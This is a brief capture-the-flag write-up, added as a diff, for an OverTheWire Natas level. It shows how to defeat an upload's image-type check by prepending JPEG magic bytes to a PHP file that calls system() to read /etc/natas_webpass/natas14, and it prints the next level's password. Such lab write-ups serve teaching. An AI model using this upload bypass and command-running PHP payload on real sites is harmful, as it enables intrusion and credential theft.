@@ -1,0 +1,21 @@
+Same to same like natas13, but this time image need to bypass image type verification function,
+
+so to bypass this function, simply added jpg header format,
+\xff\xd8\xff at start of image
+
+
+And it's optional but we can add \xff\d9 in the end.
+
+$ printf '\xff\xd8\xff' > agent.jpg 
+$
+
+<?php
+$output = system('cat /etc/natas_webpass/natas14');
+echo '<pre>'.$output.'</pre>'
+?>
+ 
+
+
+Username : natas14
+Password : Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
